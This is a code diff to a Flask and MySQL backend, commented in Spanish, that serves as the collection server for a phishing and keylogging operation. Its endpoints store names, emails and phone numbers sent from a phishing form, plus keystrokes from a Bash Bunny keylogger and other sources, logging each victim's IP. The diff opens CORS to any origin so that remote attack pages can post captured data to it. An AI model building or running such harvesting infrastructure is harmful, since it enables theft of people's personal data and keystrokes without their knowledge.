@@ -1,5 +1,7 @@
 from flask import Flask, request, jsonify
 
+from flask_cors import CORS
+
 import mysql.connector
 
 from datetime import datetime
@@ -7,12 +9,14 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+CORS(app)  # Permite solicitudes desde cualquier origen
+
 
 # Configuración de MySQL
 
 db_config = {
 
-    "host": "mysql-db",  # Nombre del servicio en docker-compose.yml
+    "host": "mysql-db",
 
     "user": "sea",
 
@@ -23,9 +27,9 @@ db_config = {
 }
 
 
-# Ruta para recibir datos del Phishing
+#Phishing
 
-# Ruta para guardar los datos del formulario web
+# Ruta para guardar datos del formulario
 
 @app.route('/guardar-formulario', methods=['POST'])
 
@@ -38,7 +42,7 @@ def guardar_formulario():
         return jsonify({"error": "Solicitud vacía"}), 400
 
 
-    nombre = data.get("nombre_apellidos")
+    nombre_apellidos = data.get("nombre_apellidos")
 
     email = data.get("email")
 
@@ -49,9 +53,14 @@ def guardar_formulario():
     fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 
-    if not nombre or not email or not telefono:
+    if not nombre_apellidos or not email or not telefono:
 
         return jsonify({"error": "Faltan campos requeridos"}), 400
+
+
+    conexion = None
+
+    cursor = None
 
 
     try:
@@ -59,7 +68,6 @@ def guardar_formulario():
         conexion = mysql.connector.connect(**db_config)
 
         cursor = conexion.cursor()
-
 
         query = """
 
@@ -69,20 +77,7 @@ def guardar_formulario():
 
         """
 
-        cursor.execute(query, (
-
-            fecha,
-
-            ip_cliente,
-
-            nombre,
-
-            email,
-
-            telefono
-
-        ))
-
+        cursor.execute(query, (fecha, ip_cliente, nombre_apellidos, email, telefono))
 
         conexion.commit()
 
@@ -105,8 +100,7 @@ def guardar_formulario():
             conexion.close()
 
 
-
-# Ruta para recibir datos del keylogger Bash Bunny
+# Bash Bunny
 
 @app.route('/guardar-bashbunny', methods=['POST'])
 
@@ -121,7 +115,7 @@ def guardar_bashbunny():
 
     datos = data.get("datos")
 
-    ip_cliente = request.remote_addr  # Capturar IP del usuario
+    ip_cliente = request.remote_addr
 
     fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
@@ -137,11 +131,9 @@ def guardar_bashbunny():
 
         cursor = conexion.cursor()
 
-
         query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'B')"
 
         cursor.execute(query, (fecha, ip_cliente, datos))
-
 
         conexion.commit()
 
@@ -164,8 +156,7 @@ def guardar_bashbunny():
             conexion.close()
 
 
-
-# Ruta para recibir datos del ilimitado
+# Ilimitado
 
 @app.route('/guardar-email', methods=['POST'])
 
@@ -180,7 +171,7 @@ def guardar_email():
 
     datosI = data.get("datosI")
 
-    ip_cliente = request.remote_addr  # Capturar IP del usuario
+    ip_cliente = request.remote_addr
 
 
     if not datosI:
@@ -194,11 +185,9 @@ def guardar_email():
 
         cursor = conexion.cursor()
 
-
         query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (NOW(), %s, %s, 'I')"
 
         cursor.execute(query, (ip_cliente, datosI))
-
 
         conexion.commit()
 
@@ -221,7 +210,7 @@ def guardar_email():
             conexion.close()
 
 
-# Ruta para recibir datos de una imagen
+# Imagen
 
 @app.route('/guardar-img', methods=['POST'])
 
@@ -236,7 +225,7 @@ def guardar_img():
 
     datosImg = data.get("datosImg")
 
-    IP_cliente = request.remote_addr  # Capturar IP del usuario
+    IP_cliente = request.remote_addr
 
 
     if not datosImg:
@@ -250,13 +239,9 @@ def guardar_img():
 
         cursor = conexion.cursor()
 
-
         query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (NOW(), %s, %s, 'P')"
 
-        # cursor.execute(query, (IP_cliente, datosImg))
-
-        cursor.execute(query, (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), IP_cliente, datosImg))
-
+        cursor.execute(query, (IP_cliente, datosImg))
 
         conexion.commit()
 
